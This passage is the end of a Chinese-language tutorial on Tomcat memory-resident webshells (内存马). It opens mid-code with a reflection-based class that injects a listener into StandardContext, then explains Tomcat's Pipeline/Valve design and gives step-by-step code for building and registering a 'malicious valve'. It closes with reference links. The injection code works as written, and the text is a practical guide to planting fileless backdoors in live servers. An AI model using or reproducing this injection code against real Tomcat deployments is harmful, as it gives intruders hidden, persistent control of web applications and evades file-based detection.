    public class listenerShell {

        public static void injection(org.apache.catalina.core.StandardContext standardContext, javax.servlet.ServletRequestListener listener){
            try{
                java.lang.reflect.Field applicationEventListenersObjectsField = standardContext.getClass().getDeclaredField("applicationEventListenersObjects");
                applicationEventListenersObjectsField.setAccessible(true);
                Object[] applicationEventListenersObjects = (Object[]) applicationEventListenersObjectsField.get(standardContext);
                if(applicationEventListenersObjects != null && applicationEventListenersObjects.length > 0){
                    Object[] newObjects = new Object[applicationEventListenersObjects.length + 1];
                    System.arraycopy(applicationEventListenersObjects, 0, newObjects, 0, applicationEventListenersObjects.length);
                    newObjects[applicationEventListenersObjects.length] = listener;
                    applicationEventListenersObjectsField.set(standardContext, newObjects);
                }
                else {
                    try {
                        java.lang.reflect.Method setApplicationEventListeners = standardContext.getClass().getMethod("setApplicationEventListeners", Object[].class);
                        setApplicationEventListeners.invoke(standardContext, new Object[]{new Object[]{listener}});
                    }catch (Exception e){}
                }
            }catch (Exception e){
                try {
                    java.lang.reflect.Method addApplicationEventListener = standardContext.getClass().getMethod("addApplicationEventListener", Object.class);
                    addApplicationEventListener.invoke(standardContext, listener);
                }catch (Exception e1){}
            }
        }
    }
    ```

## Valve型内存马

### 概念  

1. Pipeline组件  
tomcat由Connector和Container两部分组成，而当网络请求过来的时候Connector先将请求包装为Request，然后将Request交由Container进行处理，最终返回给请求方。  
当请求到达Container中，并不会直接在四个容器中传递，而是调用了本身的一个组件去处理，这个组件就叫做pipeline组件。  
2. Pipeline接口  
Pipeline接口是Pipeline组件的定义，由StandardPipeline类标准实现，提供了各种对Valve的操作方法。
3. Valve接口  
每个Pipeline组件上至少会设定一个Valve，Valve接口是Value的定义，有一个抽象实现类ValveBase。  
4. StandardxxxValve类  
在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，格式为StandardxxxValve，共同维护一个StandardPipeline实例。

### 注入Valve型内存马步骤

1. 获取ServletContext对象
2. 获取StandardPipeline对象

    ```java
    Pipeline pipeline = standardContext.getPipeline();
    ```

3. 编写恶意value类

    ```java
    import org.apache.catalina.connector.Request;
    import org.apache.catalina.connector.Response;
    import org.apache.catalina.valves.ValveBase;
    import java.io.IOException;

    public class DemoValue extends ValveBase {

        public void invoke(Request request, Response response) throws IOException {
            response.getOutputStream().write("qaz123".getBytes());
            response.getOutputStream().flush();
            response.getOutputStream().close();
        }
    }
    ```

4. 将恶意Valve添加进StandardPipeline

    ```java
    pipeline.addValve(new DemoValue());
    ```

5. 完整代码

    ```java
    public class valueShell {

        public static void injection(org.apache.catalina.core.StandardContext standardContext,  org.apache.catalina.valves.ValveBase value){
            org.apache.catalina.Pipeline pipeline = standardContext.getPipeline();
            pipeline.addValve(value);
        }

    }
    ```

## 相关链接

1. tomcat全版本下载地址:
    ><https://archive.apache.org/dist/tomcat>  
2. 参考:  
    ><https://xz.aliyun.com/t/9914>  
    ><https://xz.aliyun.com/t/7388>  
    ><https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/>  
    ><https://www.cnblogs.com/gaorenyusi/p/18393078>
